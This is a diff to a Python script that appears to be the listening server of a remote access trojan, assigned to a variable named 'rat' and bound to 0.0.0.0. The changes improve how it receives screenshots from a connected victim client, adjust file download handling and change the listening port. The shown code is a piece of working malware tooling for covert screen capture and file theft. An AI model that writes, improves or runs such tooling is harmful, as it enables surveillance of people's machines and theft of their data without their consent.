@@ -1,8 +1,6 @@
 #!/usr/bin/env python3
 
 import socket
-import subprocess
-import os
 import pyfiglet
 import json
 import base64
@@ -73,22 +71,21 @@ class SERVER:
         print('Message Sent!')
     
     
-    def screenshot(self):
+    def screenshot(self, command):
         client.send(command.encode())
-        BUFF_SIZE = 4096
-        data = bytearray()
-        while True:
-            packet = client.recv(BUFF_SIZE)
-            if not packet:
-                break
-            data.extend(packet)
+        data_len = client.recv(1024).decode()
+        time.sleep(1)
+        bytes = bytearray()
+        while len(bytes) <= int(data_len) - 1:
+            data = client.recv(1)
+            bytes.extend(data)
         dt = datetime.now()
         ts = datetime.timestamp(dt)
         filename = 'screenshot' + str(ts) + '.png'
         with open(filename, 'wb') as open_file:
-            open_file.write(data)
+            open_file.write(bytes)
             open_file.close()
-            self.progressbar()
+        self.progressbar()
         print("Screenshot Downloaded!")
         
     def download(self):
@@ -98,7 +95,6 @@ class SERVER:
             name = convert_json['name']
             bytes = convert_json['data']
             b64decoded_bytes = base64.b64decode(bytes)
-            print(name)
             if '.' in name:
                 file_name = name.split('.')
                 # open in binary
@@ -182,7 +178,7 @@ class SERVER:
                         print(data_output)
 
                 case 'screenshot':
-                    self.screenshot()
+                    self.screenshot(command)
 
                 case 'sendmessage':
                     self.sendmessage()
@@ -198,7 +194,7 @@ class SERVER:
 
 
 # setting host port and ip to construct with the server class
-rat = SERVER('0.0.0.0', 4444)
+rat = SERVER('0.0.0.0', 4450)
 
 
 if __name__ == '__main__':
